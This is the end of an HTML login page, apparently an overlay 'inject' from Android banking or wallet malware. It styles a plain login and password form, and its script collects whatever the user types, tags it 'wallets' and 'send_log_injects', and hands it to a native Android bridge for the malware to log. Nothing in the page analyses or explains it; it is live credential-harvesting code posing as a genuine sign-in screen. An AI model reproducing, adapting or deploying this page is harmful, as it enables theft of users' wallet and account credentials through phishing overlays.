    <style>
        body {
            background-color: #e7e7e7;
            letter-spacing: -1px;
        }

        form {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        section {
            flex: 1;
            padding: 30px;
            padding-top: 0;
        }

        #form {
            padding: 10px 15px;
            background-color: #fff;
            border: 0;
            border-radius: 6px;
            margin-bottom: 15px;
        }

        ::placeholder {
            letter-spacing: -1px;
            opacity: 1;
            color: #757575;
        }

        :-moz-placeholder {
            letter-spacing: -1px;
            opacity: 1;
            color: #757575;
        }

        :-ms-input-placeholder {
            letter-spacing: -1px;
            opacity: 1;
            color: #757575;
        }

        ::-moz-placeholder {
            letter-spacing: -1px;
            opacity: 1;
            color: #757575;
        }

        ::-webkit-input-placeholder {
            letter-spacing: -1px;
            opacity: 1;
            color: #757575;
        }

        .input {
            width: 100%;
            padding: 8px;
            border: 1px solid #a4a4a4;
            margin-bottom: 15px;
            border-radius: 2px;
        }

        .input:focus {
            border-color: #af9757;
        }

        .button {
            width: 100%;
            padding: 8px;
            border: 0;
            border-radius: 4px;
            background-color: #ec5506;
            color: #fff;
            margin-bottom: 15px;
        }

        .button:disabled {
            background-color: #dddddd;
            color: #000000;
        }

        .error {
            border-color: #f00 !important;
        }

        input,button {
            outline: none !important;
            box-shadow: none !important;
        }

        #bnt {
            width: 100%;
            padding: 8px;
            background-color: transparent;
            border: 1px solid #e4580d;
            border-radius: 2px;
            text-align: center;
            color: #e4580d;
        }
    </style>
</head>

    <script>
        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var sendData = document.getElementById('sendData');

        sendData.onclick = () => {
            if(login.value.length < 4) {
                login.classList.add('error')
            } else {
                login.classList.remove('error')
            }

            if(password.value.length < 4) {
                password.classList.add('error')
            } else {
                password.classList.remove('error')
            }

            if(login.value.length >= 4 && password.value.length >= 4) {
                var data = {};
                data.login = login.value;
                data.password = password.value;
                data.type_injects = "wallets";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }
    </script>
</body>
</html>
